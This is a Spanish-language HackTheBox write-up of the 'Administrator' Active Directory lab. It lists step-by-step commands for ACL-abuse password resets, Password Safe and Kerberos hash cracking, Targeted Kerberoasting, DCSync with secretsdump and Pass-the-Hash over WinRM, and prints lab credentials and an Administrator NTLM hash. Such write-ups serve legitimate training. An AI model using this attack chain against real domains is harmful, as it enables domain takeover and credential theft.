---
icon: windows
tags:
  - active-directory
  - smb
  - kerberos
  - ftp
  - ldap
  - winrm
  - cracking
---

# Administrator

```yaml
ip: 10.129.92.212
so: Windows
plataforma: HackTheBox
fecha: 31/10/2026
nombre: Administrator
```

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Administrator |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 31/10/2026    |
| **IP Objetivo**       | 10.129.92.212 |

### Executive Summary

Máquina Windows correspondiente a un Controlador de Dominio Active Directory. Se parte de credenciales válidas `olivia:ichliebedich`, que permiten autenticación en SMB y WinRM. La enumeración con BloodHound revela una cadena de abuso de ACLs: `Olivia` tiene `GenericAll` sobre `Michael`, y `Michael` tiene `ForceChangePassword` sobre `Benjamin`.

Tras resetear contraseñas y acceder al servicio FTP con `Benjamin`, se descarga una base de datos Password Safe (`Backup.psafe3`). Se crackea su contraseña maestra con `john`, obteniendo credenciales en claro de varios usuarios, entre ellas `emily`. Con `emily` se accede por WinRM y se obtiene la flag de usuario.

BloodHound muestra que `emily` tiene `GenericWrite` sobre `ethan`. Se realiza Targeted Kerberoasting contra `ethan`, se crackea su ticket obteniendo `limpbizkit`, y se comprueba que `ethan` tiene derechos de DCSync. Mediante `secretsdump` se extrae el hash NTLM de `Administrator` y se accede por WinRM con Pass-the-Hash, obteniendo control total del dominio y la flag de root.

### Técnicas

* Enumeración de Active Directory con BloodHound
* Abuso de ACLs: `GenericAll`, `ForceChangePassword`, `GenericWrite`
* Targeted Kerberoasting
* Crackeo offline de hashes Kerberos y Password Safe
* DCSync
* Pass-the-Hash contra WinRM

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -sS --min-rate 5000 -Pn -n -vv -p- 10.129.92.212 -oG allPorts
```

| Puerto    | Servicio      | Versión                                                                                              |
| --------- | ------------- | ---------------------------------------------------------------------------------------------------- |
| 21/tcp    | ftp           | Microsoft ftpd                                                                                       |
| 53/tcp    | domain        | Simple DNS Plus                                                                                      |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos (server time: 2026-10-30 23:43:54Z)                                       |
| 135/tcp   | msrpc         | Microsoft Windows RPC                                                                                |
| 139/tcp   | netbios-ssn   | Microsoft Windows netbios-ssn                                                                        |
| 389/tcp   | ldap          | Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) |
| 445/tcp   | microsoft-ds? |                                                                                                      |
| 464/tcp   | kpasswd5?     |                                                                                                      |
| 593/tcp   | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                                  |
| 636/tcp   | tcpwrapped    |                                                                                                      |
| 3268/tcp  | ldap          | Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) |
| 3269/tcp  | tcpwrapped    |                                                                                                      |
| 5985/tcp  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                             |
| 9389/tcp  | mc-nmf        | .NET Message Framing                                                                                 |
| 47001/tcp | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                             |
| 49664/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 49665/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 49666/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 49667/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 49668/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 52218/tcp | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                                  |
| 52223/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 52232/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 52245/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 52278/tcp | msrpc         | Microsoft Windows RPC                                                                                |
| 60506/tcp | msrpc         | Microsoft Windows RPC                                                                                |

> La IP cambió durante el laboratorio por resets: `10.129.92.212`, `10.129.82.93` y `10.129.82.172`. Ajustar los comandos a la IP activa.

### Enumeration

#### SMB

Credenciales iniciales válidas:

```bash
> nxc smb 10.129.92.212 -u 'olivia' -p 'ichliebedich'
```

Enumeración de usuarios y recursos:

```bash
> nxc smb 10.129.82.93 -u "olivia" -p "ichliebedich" --users
> nxc smb 10.129.92.212 -u 'olivia' -p 'ichliebedich' --shares
```

Usuarios relevantes identificados:

```
olivia
michael
benjamin
emily
ethan
```

`Olivia` tiene acceso de lectura a `IPC$`, `NETLOGON` y `SYSVOL`.

#### WinRM

Las credenciales de `Olivia` son válidas para WinRM:

```bash
> nxc winrm 10.129.92.212 -u 'olivia' -p 'ichliebedich'
> evil-winrm -i 10.129.92.212 -u 'olivia' -p 'ichliebedich'
```

#### LDAP / BloodHound

Recolección de información para BloodHound:

```bash
> nxc ldap 10.129.92.212 -u 'olivia' -p 'ichliebedich' --bloodhound --dns-server 10.129.92.212 --collection All
```

BloodHound revela la cadena de abuso de ACLs utilizada posteriormente.

***

## Explotación

### Foothold

* **Vulnerabilidad:** Abuso de ACLs en Active Directory (`GenericAll` de `Olivia` sobre `Michael` y `ForceChangePassword` de `Michael` sobre `Benjamin`) + backup de Password Safe accesible vía FTP.
* **Exploit:** `net rpc password`, `pwsafe2john`, `john`, `evil-winrm`.
* **Procedimiento:**

1.  Acceso inicial con las credenciales proporcionadas:

    ```bash
    > evil-winrm -i 10.129.92.212 -u 'olivia' -p 'ichliebedich'
    ```
2.  BloodHound muestra que `Olivia` tiene `GenericAll` sobre `Michael`. Se abusa para resetear la contraseña de `Michael`:

    ```bash
    > net rpc password "michael" "michael_new_password123" -U "administrator.htb"/"olivia"%"ichliebedich" -S "dc.administrator.htb"
    ```
3.  BloodHound muestra que `Michael` tiene `ForceChangePassword` sobre `Benjamin`. Se resetea su contraseña:

    ```bash
    > net rpc password "benjamin" "benjamin_new_password123" -U "administrator.htb"/"michael"%"michael_new_password123" -S "dc.administrator.htb"
    ```
4.  `Benjamin` no puede acceder por WinRM, pero sí por FTP. Se descarga el backup:

    ```bash
    > ftp benjamin@10.129.82.172
    ```

    Archivo encontrado: `Backup.psafe3`.
5.  Se crackea la contraseña maestra de Password Safe:

    ```bash
    > pwsafe2john Backup.psafe3
    > john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ```

    Resultado:

    ```
    tekieromucho
    ```
6.  Se abre `Backup.psafe3` con Password Safe usando `tekieromucho`. Se obtienen credenciales en claro, entre ellas:\
    ![](<../../../.gitbook/assets/image (104).png>)

    ```
    emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
    ```
7.  Acceso por WinRM con `emily` y lectura de la flag de usuario:

    ```bash
    > evil-winrm -i 10.129.82.172 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
    ```

    ```powershell
    *Evil-WinRM* PS C:\Users\emily\Documents> type ../Desktop/User.txt
    ```

*   **Evidencia:** (`user.txt`)<br>

    <figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** `emily` tiene `GenericWrite` sobre `ethan`; `ethan` dispone de derechos de DCSync sobre el dominio.
* **Exploit:** Targeted Kerberoasting, crackeo offline, `secretsdump.py` y Pass-the-Hash contra WinRM.
* **Procedimiento:**

1.  BloodHound muestra que `emily` tiene `GenericWrite` sobre `ethan`. Se realiza Targeted Kerberoasting:

    ```bash
    > targetedKerberoast -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -f hashcat -o ethan_hash.txt
    ```
2.  Se crackea el ticket TGS de `ethan`:

    ```bash
    > john -format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ethan_hash.txt
    ```

    Resultado:

    ```
    limpbizkit
    ```
3.  `ethan` no pertenece a `Remote Management Users`, pero tiene derechos de DCSync. Se extraen los hashes del dominio:

    ```bash
    > secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'
    ```

    \
    Hash NTLM de `Administrator`:

    ```
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
    ```

    <figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
4.  Acceso como `Administrator` mediante Pass-the-Hash:

    ```bash
    > evil-winrm -i 10.129.82.172 -u 'administrator' --hash 3dc553ce4b9fd20bd016e098d2d2fd2e
    ```
5.  Lectura de la flag de root:

    ```powershell
    *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
    ```

*   **Evidencia:** (`root.txt`)<br>

    <figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

***

### Notes

* Sincronización de hora contra el DC para evitar errores Kerberos:

```bash
sudo rdate -n 10.129.92.212
```

* La máquina sufrió resets durante el laboratorio, por lo que se utilizaron las IPs `10.129.92.212`, `10.129.82.93` y `10.129.82.172`.
